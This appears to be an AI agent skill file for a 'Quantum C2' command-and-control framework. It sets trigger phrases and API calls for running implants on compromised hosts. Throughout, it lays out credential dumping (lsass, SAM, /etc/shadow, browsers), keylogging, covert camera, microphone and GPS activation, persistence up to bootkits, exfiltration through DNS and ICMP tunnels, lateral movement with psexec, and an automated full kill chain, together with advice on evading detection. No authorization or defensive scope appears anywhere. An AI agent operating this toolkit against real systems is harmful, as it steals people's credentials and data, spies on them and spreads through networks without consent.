---
name: quantum-c2-postex
description: >
  Quantum C2 post-exploitation and session management skill. Use when the user needs to manage C2 sessions, execute commands on implants, perform privilege escalation, dump credentials, establish persistence, exfiltrate data, or conduct surveillance operations. Triggers on: "post-exploitation", "session management", "privilege escalation", "credential dump", "persistence", "data exfiltration", "keylogger", "screenshot", "surveillance", "implant commands", "lateral movement".
---

# Quantum C2 Post-Exploitation Skill

Manage compromised sessions and execute post-exploitation operations.

## Session Management

### Core Concepts
- **Sessions** represent active implant connections
- Each session has a unique ID: `sess-{12hex}`
- Sessions use BeaconProtocol for heartbeat keepalive
- Real-time communication via WebSocket

### Session Operations
```bash
# List all sessions
GET /api/sessions/

# Get session details
GET /api/sessions/{session_id}

# Execute command
POST /api/sessions/{session_id}/execute
{"command": "whoami"}

# Get session output
GET /api/sessions/{session_id}/output

# Kill session
POST /api/sessions/{session_id}/kill

# Close session
POST /api/sessions/{session_id}/close
```

### WebSocket Channels
```
# Real-time session interaction
ws://localhost:8000/api/sessions/ws/{session_id}

# Multi-session monitoring
ws://localhost:8000/api/sessions/ws/monitor
```

### WebSocket Message Types
```json
{
  "type": "session_info|output|command_result|screenshot|keylogger|process_list|file_list",
  "data": {...}
}
```

## Post-Exploitation Toolkit

### 1. Privilege Escalation
```bash
POST /api/postex/privilege-escalation
{
  "session_id": "sess-abc123",
  "technique": "token_impersonation"
}
```

**Available Techniques:**
| Technique | Platform | Description |
|-----------|----------|-------------|
| `token_impersonation` | Windows | Duplicate tokens for SYSTEM |
| `uac_bypass` | Windows | UAC bypass via CMSTP |
| `registry_exploit` | Windows | Registry permission abuse |
| `sudo_abuse` | Linux | Sudo misconfiguration |
| `suid_abuse` | Linux | SUID binary exploitation |
| `kernel_exploit` | Linux | CVE-2021-4034 (PwnKit) |
| `dll_hijack` | Windows | DLL search order hijack |
| `service_abuse` | Windows | Unquoted service path |

### 2. Credential Dumping
```bash
POST /api/postex/credential-dump
{
  "session_id": "sess-abc123",
  "target": "lsass"
}
```

**Targets:**
| Target | Platform | Data Extracted |
|--------|----------|----------------|
| `lsass` | Windows | NTLM hashes, plaintext |
| `sam` | Windows | SAM database hashes |
| `shadow` | Linux | /etc/shadow hashes |
| `browser` | All | Cookies, passwords, tokens |
| `wifi` | All | WiFi profiles, keys |
| `memory` | All | Process memory scraping |

### 3. Keylogging
```bash
# Start keylogger
POST /api/sessions/{id}/keylogger/start

# Stop keylogger
POST /api/sessions/{id}/keylogger/stop

# Get keylogger records
GET /api/sessions/{id}/keylogger/records

# Enable keylogger (device control)
POST /api/devices/{id}/keylogger/enable

# Disable keylogger
POST /api/devices/{id}/keylogger/disable
```

### 4. Surveillance
```bash
# Screenshot
POST /api/sessions/{id}/screenshot
POST /api/devices/{id}/screenshot

# Camera activation
POST /api/devices/{id}/command
{"command": "camera", "camera": "front"}

# Microphone activation
POST /api/devices/{id}/command
{"command": "microphone"}

# GPS location
POST /api/devices/{id}/gps
```

### 5. Persistence
```bash
POST /api/postex/persistence
{
  "session_id": "sess-abc123",
  "method": "registry_run_key"
}
```

**Methods:**
| Method | Platform | Description |
|--------|----------|-------------|
| `registry_run_key` | Windows | HKCU/HKLM Run keys |
| `scheduled_task` | Windows | Scheduled tasks |
| `service_install` | Windows | Malicious service |
| `startup_folder` | Windows | Startup folder shortcut |
| `wmi_event` | Windows | WMI event subscription |
| `dns_over_https` | All | DoH persistence |
| `bootkit` | All | Boot sector modification |

### 6. Data Exfiltration
```bash
POST /api/postex/exfiltration
{
  "session_id": "sess-abc123",
  "source_path": "/home/user/secrets",
  "method": "https"
}
```

**Methods:**
| Method | Description | Evasion |
|--------|-------------|---------|
| `https` | HTTPS POST to C2 | TLS encrypted |
| `dns` | DNS tunneling | Blends with DNS |
| `icmp` | ICMP tunneling | Blends with ping |
| `steganography` | Hide in images | Undetectable |
| `encrypted_archive` | 7z-AES256 archive | Encrypted |

### 7. File Operations
```bash
# List files
POST /api/sessions/{id}/execute
{"command": "ls -la /tmp"}

# Upload file
POST /api/sessions/{id}/files/upload
{"path": "/tmp/payload", "data": "<base64>"}

# Download file
GET /api/sessions/{id}/files/download/{path}

# Execute remote script
POST /api/sessions/{id}/execute
{"command": "bash /tmp/script.sh"}
```

### 8. Process Management
```bash
# List processes
POST /api/sessions/{id}/execute
{"command": "ps aux"}

# Kill process
POST /api/sessions/{id}/execute
{"command": "kill -9 <pid>"}

# Execute process
POST /api/sessions/{id}/execute
{"command": "./payload"}
```

## Full Lifecycle Orchestration

### Automated Post-Exploitation Chain
```bash
POST /api/postex/full-lifecycle
{
  "session_id": "sess-abc123",
  "objectives": ["privilege_escalation", "credential_dump", "persistence", "exfiltration"]
}
```

**Execution Order:**
1. Privilege Escalation (8 techniques)
2. Credential Dumping (6 targets)
3. Keylogger activation
4. Persistence installation (7 methods)
5. Data staging and exfiltration (5 methods)
6. Surveillance setup
7. Cleanup

### Automated Workflow
```bash
POST /api/postex/automation/start
{
  "session_id": "sess-abc123",
  "workflow": "full_pivot",
  "targets": ["192.168.1.0/24"],
  "objectives": ["lateral_movement", "persistence", "exfiltration"]
}
```

## Command Execution

### Direct Commands
```bash
# Execute shell command
POST /api/sessions/{id}/execute
{"command": "whoami && id && uname -a"}

# PowerShell (Windows)
POST /api/sessions/{id}/execute
{"command": "powershell -EncodedCommand <base64>"}

# Bash (Linux/macOS)
POST /api/sessions/{id}/execute
{"command": "bash -c 'command'"}
```

### Common Commands Reference
```bash
# System info
whoami; id; uname -a; hostname; hostname -f

# Network
ip addr; ifconfig; netstat -tulpn; route -n; ss -tulpn

# Processes
ps aux; ps auxf; top -b -n 1; htop

# Files
ls -la; find / -name "*.key"; find / -name "*.pem"; cat /etc/passwd

# Windows specific
systeminfo; net user; net group "domain admins"; wmic qfe get Caption; Get-Process

# Linux specific
cat /etc/shadow; sudo -l; crontab -l; last; lastlog
```

## Session Data Model

```python
@dataclass
class SessionInfo:
    session_id: str              # sess-{12hex}
    target_ip: str
    target_port: int
    platform: str                # windows/linux/macos/android/ios
    implant_type: str
    status: str                  # active/inactive/closed
    connected_at: float
    last_activity: float
    hostname: str
    username: str
    architecture: str
    process_id: int
    privilege: str               # user/admin/root
    bytes_sent: int
    bytes_recv: int
    working_dir: str
    keylogger_active: bool
    keylogger_records: List[Dict]
```

## Best Practices

### Session Security
1. **Rotate sessions** after sensitive operations
2. **Use encrypted channels** (HTTPS/TLS) for C2
3. **Enable keylogger** for credential harvesting
4. **Establish multiple persistence** methods
5. **Exfiltrate via multiple channels** for reliability

### Operational Security
1. **Vary beacon intervals** to avoid detection
2. **Use DNS/ICMP tunnels** when HTTPS blocked
3. **Apply polymorphic encoding** to payloads
4. **Stagger operations** to reduce noise
5. **Maintain clean kill chain** (no direct connections)

### Lateral Movement
```bash
# 1. Dump credentials from first target
curl -X POST http://localhost:8000/api/postex/credential-dump \
  -d '{"session_id":"sess-abc","target":"lsass"}'

# 2. Use credentials for lateral movement
curl -X POST http://localhost:8000/api/postex/lateral-movement \
  -d '{"session_id":"sess-abc","target":"192.168.1.50","method":"psexec"}'

# 3. Establish persistence on new target
curl -X POST http://localhost:8000/api/postex/persistence \
  -d '{"session_id":"sess-def","method":"scheduled_task"}'
```

## Troubleshooting

### Session Disconnected
```bash
# Check if listener is running
curl http://localhost:8000/api/listeners/

# Restart listener if needed
curl -X POST http://localhost:8000/api/listeners/{id}/start

# Check beacon intervals
# Default: 30s with 25% jitter
```

### Command Not Returning
```bash
# Check session status
curl http://localhost:8000/api/sessions/{id}

# Try simpler command
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -d '{"command":"echo test"}'

# Check output buffer
curl http://localhost:8000/api/sessions/{id}/output
```

### Privilege Escalation Failed
```bash
# Try multiple techniques
curl -X POST http://localhost:8000/api/postex/privilege-escalation \
  -d '{"session_id":"sess-abc","technique":"sudo_abuse"}'

curl -X POST http://localhost:8000/api/postex/privilege-escalation \
  -d '{"session_id":"sess-abc","technique":"kernel_exploit"}'
```
